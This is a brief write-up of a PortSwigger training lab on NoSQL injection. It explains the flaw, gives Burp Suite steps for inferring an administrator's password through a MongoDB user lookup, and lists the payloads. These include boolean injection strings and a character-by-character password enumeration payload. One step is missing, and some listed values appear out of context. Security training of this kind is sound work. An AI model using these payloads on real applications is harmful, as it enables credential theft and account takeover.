# Lab: Exploiting NoSQL injection to extract data

**Official PortSwigger URL:** https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data

**Lab idea:** A MongoDB-backed user lookup is vulnerable to NoSQL injection. The challenge is to recover the administrator's password through the vulnerable lookup behavior and then access that account. It practices assessing differences in query responses to infer data.

## Vulnerability in brief
NoSQL injection is a vulnerability in which untrusted input interferes with the queries an application sends to a NoSQL database. Unlike SQL databases, NoSQL systems do not share one query language or data model, so the exact syntax and behavior vary by database. PortSwigger's topic focuses on general testing concepts and MongoDB examples. [Official topic](https://portswigger.net/web-security/nosql-injection)

## Solution idea
1. In Burp's browser, access the lab and log in to the application using the credentials wiener:peter .
2. In Burp, go to Proxy > HTTP history .
3. In Repeater, submit a ' character in the user parameter.
4. Submit a valid JavaScript payload in the user parameter.
- …
6. Right-click the request and select Send to Intruder .
7. In Intruder, enumerate the password:
8. In Burp's browser, log in as the administrator user using the enumerated password.

## Payloads / key values
- `wiener:peter`
- `GET /user/lookup?user=wiener`
- `'`
- `user`
- `wiener'+'`
- `Ctrl-U`
- `wiener`
- `wiener' && '1'=='2`
- `Could not find user`
- `wiener' && '1'=='1`
- `administrator' && this.password.length < 30 || 'a'=='b`
- `administrator`
- `9`
- `8`
- `administrator' && this.password[§0§]=='§a§`
- `1`
- `2`
- `a-z`

## Official source
- [PortSwigger Academy: Lab: Exploiting NoSQL injection to extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)
